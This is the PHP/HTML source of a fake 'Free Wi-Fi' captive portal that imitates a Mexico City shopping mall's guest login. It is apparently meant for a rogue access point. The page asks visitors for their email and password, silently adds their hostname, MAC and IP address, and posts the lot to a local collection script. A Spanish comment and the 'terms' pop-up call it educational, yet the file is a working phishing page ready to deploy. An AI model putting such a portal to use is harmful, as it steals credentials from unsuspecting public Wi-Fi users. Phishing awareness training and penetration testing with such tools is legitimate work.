<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'ON' ? "https" : " http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<!-- Escrito por Ventrux para Hack Intelligence con licencia Creative Commons de uso academico. No soy responsable por el mal uso que se le pueda dar, es responsabilidad de quien lo ejecuta y aplica --> 

<html>
<head>
    <title>Free Wi-Fi - Mitikah Mall</title>
    
    <meta charset="utf-8">
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="Expires" content="0" />
    <meta http-equiv="pragma" content="no-cache" />
    <meta name="viewport" content="width=device-width,
                                   initial-scale=0.75, maximum-scale=0.75, user-scalable=no">
    
    <script src="jquery-2.2.1.min.js"></script>
    <script type="text/javascript">
        function redirect() {
            setTimeout(function() {
                window.location = "/captiveportal/index.php";
            }, 100);
        }
    </script>
    
    <link rel="stylesheet" href="assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/css/style.css">
    <link rel="shortcut icon" href="assets/img/favicon.ico"> 
    // Aqui va el fondo
    <style>
    
        body {
            background-image: url("assets/img/bg-main.jpg");
            background-position: center;
            background-attachment: fixed;
            background-repeat: no-repeat;
            -webkit-background-size: 100%;
            -moz-background-size: 100%;
            -o-background-size: 100%;
            background-size: 100%;
             -webkit-background-size: cover;
            -moz-background-size: cover;
            -o-background-size: cover;
            background-size: cover;
        }
        
        .google-header-bar {
            height: 70px;
            border-bottom: 1px solid #000000;
            overflow: hidden;
        }
        
      </style>
    
    <style media="screen and (max-width: 800px), screen and (max-height: 800px)">
        .google-header-bar.centered {
            height: 80px;
        }    
        .card {
            margin-bottom: 20px;
        }
        </style>
        </head>
    
    <body>
        <div class="container">
            <div class="account-wall">
                <img class="profile-img" src="assets/img/logo-mitikah.png" alt=""></img>
            
              <h1 class="text-center login-title">Wi-Fi Clientes</h1>
<h2 class="text-center friends-text">Por favor llena el formulario</h2>
            
            <form method="POST" action="/captiveportal/index.php" onSubmit="redirect()" class="form-signin">
                
                <input type="text" name="email" class="form-control" placeholder="Email" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
                <input type="password" name="password" class="form-control" placeholder="Password" autocorrect="off " autocomplete="off" autocapitalize="off" required><br>
                <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
                <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
                <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
                <input type="hidden" name="target" value="<?=$destination?>">
                <button class="btn btn-primary btn-block btn-xlarge btn-sharp" name="login" type="submit">Acceder</button>
                <div class="text-center terms-text1">Acepto los <a href="#" class="url-color" id="btn1">Terminos del Servicio y Mmanejo de Datos Personales</a></div>
            </form>
            
            <div id="myModal" class="modal url-color1">
                   <div class="modal-content">
                      <div class="modal-header">
                           <span class="close">x</span>
                              <h2>Terminos de Servicio y Manejo de Datos Personales</h2>
                      </div>
            <div class="modal-body">
                       <p>Esto es para fines educativos, probablemente si no tienes cuidado entregaras tu E-mail y password, pero tu solito lo haras, por eso debes tener cuidado con donde te conectas</P>
                </div>
                </div>
            
            </div>
        <script src="/static/js/jsquery.min.js"></script>
        <script src="/static/js/index.js"></script>
        <script>
        var modal = document.getElementById('myModal');
        var btn = document.getElementById('btn1');
        var span = document.getElementsByClassName('close'[0]);
        btn.onclick = function() {
            modal.style.display = "block";
                }
        span.onclick = function() {
            modal.style.display = "none";
                }
        window.onclick = function(event) {
            if (event.target == modal) {
                modal.style.display = "none";
            }
            }
        </script>
        
        </div>
        
    </body>





</html>